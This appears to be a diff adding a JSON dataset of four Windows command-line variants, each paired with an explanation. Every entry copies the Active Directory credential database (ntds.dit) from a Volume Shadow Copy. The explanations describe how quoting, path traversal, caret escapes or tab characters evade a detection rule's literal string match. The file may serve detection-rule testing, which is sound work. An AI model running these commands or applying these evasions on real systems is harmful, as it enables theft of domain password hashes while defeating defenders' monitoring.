@@ -1,0 +1,18 @@
+[
+  {
+    "output": "\"cmd.exe\" /c copy \"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit\" C:\\Windows\\Temp\\ntds.dit",
+    "explanation": "Insertion technique: Wrapping the Volume Shadow Copy source path in double quotes disrupts the continuous character sequence string check. This successfully evades the literal match for '\\\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy' required by the 'selection' condition, while cmd.exe parses and strips the quotes normally during execution."
+  },
+  {
+    "output": "\"cmd.exe\" /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\..\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\Windows\\Temp\\ntds.dit",
+    "explanation": "Recoding / Encoding technique: Utilizing path traversal normalization ('\\..\\') inside the device namespace breaks the exact literal string filter tracking the device sequence. The Windows Object Manager and file system API resolve the tracking anchors transparently upon execution, ensuring identical access to the target path layout."
+  },
+  {
+    "output": "\"cmd.exe\" /c c^o^p^y \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\Windows\\Temp\\ntds.dit",
+    "explanation": "Insertion technique: Injects command shell caret escape characters ('^') inside the internal cmd.exe 'copy' verb name. The command line interpreter handles and strips the escape tokens upon execution initialization, logging 'c^o^p^y' in process telemetry, which subverts the explicit 'copy ' check."
+  },
+  {
+    "output": "\"cmd.exe\" /c copy\t\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit\tC:\\Windows\\Temp\\ntds.dit",
+    "explanation": "Substitution technique: Replaces the required literal space characters surrounding the 'copy' command with horizontal tab characters ('\\t'). The native command prompt processor interprets tabs as valid token parameters whitespace separators, neutralizing the strict rules that mandate an explicit trailing single space character ('copy ')."
+  }
+]
